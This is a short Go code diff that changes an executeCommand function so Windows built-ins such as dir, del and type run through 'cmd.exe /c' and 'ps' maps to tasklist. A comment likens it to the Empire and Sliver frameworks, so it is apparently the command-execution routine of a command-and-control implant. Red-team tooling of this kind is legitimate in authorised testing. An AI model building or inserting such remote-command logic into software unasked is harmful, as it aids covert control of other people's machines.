@@ -900,7 +900,32 @@ func executeCommand(cmd string) string {
 		return ""
 	}
 	
-	execCmd := exec.Command(parts[0], parts[1:]...)
+	// Handle Windows built-in commands (like dir, ps, ls) by wrapping in cmd.exe
+	// This matches how Empire/Sliver handle these commands
+	cmdName := strings.ToLower(parts[0])
+	var execCmd *exec.Cmd
+	
+	// Windows built-in commands that need cmd.exe wrapper
+	if cmdName == "dir" || cmdName == "cd" || cmdName == "type" || cmdName == "copy" || 
+	   cmdName == "del" || cmdName == "mkdir" || cmdName == "rmdir" || cmdName == "move" ||
+	   cmdName == "ren" || cmdName == "echo" || cmdName == "set" || cmdName == "cls" {
+		// Use cmd.exe /c for Windows built-ins
+		execCmd = exec.Command("cmd.exe", "/c", cmd)
+	} else if cmdName == "ps" || cmdName == "tasklist" {
+		// Use tasklist for process listing on Windows
+		execCmd = exec.Command("tasklist")
+		if len(parts) > 1 {
+			// Handle additional arguments
+			execCmd = exec.Command("tasklist", parts[1:]...)
+		}
+	} else if cmdName == "ls" {
+		// ls is not native on Windows, use dir instead
+		execCmd = exec.Command("cmd.exe", "/c", "dir", strings.Join(parts[1:], " "))
+	} else {
+		// Regular command execution
+		execCmd = exec.Command(parts[0], parts[1:]...)
+	}
+	
 	output, err := execCmd.CombinedOutput()
 	if err != nil {
 		result = fmt.Sprintf("Error: %v\nOutput: %s", err, string(output))
